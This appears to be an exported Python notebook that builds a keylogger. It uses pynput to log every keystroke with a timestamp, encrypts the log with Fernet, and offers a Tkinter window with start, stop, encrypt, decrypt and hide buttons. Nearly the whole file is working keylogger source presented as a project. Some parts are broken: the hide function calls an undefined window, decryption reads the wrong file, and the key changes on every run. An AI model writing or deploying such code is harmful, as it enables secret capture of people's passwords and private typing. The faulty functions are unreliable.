#!/usr/bin/env python
# coding: utf-8

# **Project Overview**:
# - The project aims to create a keylogger program that captures keystrokes on a computer.
# 
# - The program should run in the background and record all the keystrokes made by the user.
# 
# - The captured keystrokes will be stored in a log file for later analysis.

# ## Import Libraries

# In[1]:


#used listener to monitor keyboard events
# to access keystroke from the keyboard

#!python -m pip install pynput
from pynput.keyboard import Listener

import threading


# In[2]:


# to store keystrokes in the json file
import json


# In[3]:


#creating gui interface
import tkinter as tk
from tkinter import *


# **Fernet**:
# - Cryptography deals with the encryption of plaintext into ciphertext and decryption of ciphertext into plaintext.
# 
# - Python supports a cryptography package that helps us encrypt and decrypt data. 
# 
# - The fernet module of the cryptography package has inbuilt functions for the generation of the key, encryption of plaintext 
#   into ciphertext, and decryption of ciphertext into plaintext using the encrypt and decrypt methods respectively.
# 
# - The fernet module guarantees that data encrypted using it cannot be further manipulated or read without the key. 
# 
# 
# **Methods Used**:
# 
#  * generate_key() : 
#      - This method generates a new fernet key. 
#      - The key must be kept safe as it is the most important component to decrypt the ciphertext. 
#      - If the key is lost then the user can no longer decrypt the message. 
#      - Also if an intruder or hacker gets access to the key they can not only read the data but also forge the data.
#      
#  * encrypt(data)  : 
#     - It encrypts data passed as a parameter to the method. 
#     - The outcome of this encryption is known as a “Fernet token” which is basically the ciphertext. 
#     - The encrypted token also contains the current timestamp when it was generated in plaintext. 
#     - The encrypt method throws an exception if the data is not in bytes

# In[4]:


# !pip install cryptography
# !pip install paramiko

from cryptography.fernet import Fernet


# In[5]:


import datetime


# In[6]:


import sys


# In[7]:


import warnings
warnings.filterwarnings("ignore")


# ## Global Variables

# In[8]:


# Encryption key
# key is generated
key = Fernet.generate_key()


# In[9]:


# Log file path
log_file = "keystrokes.log"

# encrypt file
log_file_encrypted = "EncryptedFile_keystrokes.log"

# decrypt file
log_file_decrypted = "DecryptedFile_keystrokes.log"


# In[10]:


# to keep track of the keylogger's running status
# It is set to False initially and is toggled between True and False when starting or stopping the keylogger, respectively.
running  = False


# In[11]:


listener = None


# ## Functions

# In[12]:


def on_press(key):
    with open(log_file, "a") as f:
        f.write("{0}: {1}\n".format(datetime.datetime.now(), key))


# `In the start_keylogger() function, the keylogger is started only if running is False. Similarly, in the stop_keylogger() function, the keylogger is stopped only if running is True.
# `

# In[13]:


def start_keylogger():
    global running ,listener
    
    if not running:
        running = True
        listener = Listener(on_press=on_press)
        listener.start()
        
#         with Listener(on_press=on_press) as listener:
#             listener.join()


# In[14]:


def stop_keylogger():
    global running ,listener
    
    if running and listener is not None:
        running = False
        listener.stop()
        listener.join()
        
    # Close any open files
    with open(log_file, "a") as f:
        f.close()
    
    # Perform final encryption of the log file
    encrypt_file()
    
    exit(0)


# `Encryption and Decryption: The encrypt_file() and decrypt_file() functions use the cryptography library to encrypt and decrypt the log file using the provided encryption key.
# `

# In[15]:


# Encrypt the log file
def encrypt_file():
    
    with open(log_file, 'rb') as f:
        data = f.read()
    
    # value of key is assigned to a variable
    fernet = Fernet(key)
    
    # the plaintext is converted to ciphertext
    encrypted_data = fernet.encrypt(data)
    
    with open(log_file_encrypted, 'wb') as f:
        f.write(encrypted_data)


# In[16]:


# Decrypt the log file
def decrypt_file():
    
    with open(log_file, 'rb') as f:
        encrypted_data = f.read()
        
    # value of key is assigned to a variable
    fernet = Fernet(key)
    
    # decrypting the ciphertext
    decrypted_data = fernet.decrypt(encrypted_data)
    
    with open(log_file_decrypted, 'wb') as f:
        f.write(decrypted_data)


# `Hide Window: The hide_window() function utilizes the iconify() method to hide the program window when the "Hide" button is clicked.`

# In[17]:


# Hide the program window
def hide_window():
    window.iconify()


# ## Graphical User Interfaces (GUI)

# In[18]:


#create a window name "root"
root = tk.Tk()

#size of root window
root.geometry("300x150")

#title of root window
root.title("KeyLogger")


# In[19]:


start_button = tk.Button(root ,text="Start" ,command=start_keylogger)
stop_button  = tk.Button(root ,text="Stop"  ,command=stop_keylogger)

encrypt_button = tk.Button(root ,text="Encrypt Log" ,command=encrypt_file)
decrypt_button = tk.Button(root ,text="Decrypt Log" ,command=decrypt_file)

hide_button = tk.Button(root ,text="Hide" ,command=hide_window)


# In[20]:


start_button.pack(pady=5)
stop_button.pack(pady=5)

encrypt_button.pack(pady=5)
decrypt_button.pack(pady=5)

hide_button.pack(pady=5)


# In[21]:


# Hide the program window on startup
root.mainloop()


# In[ ]:




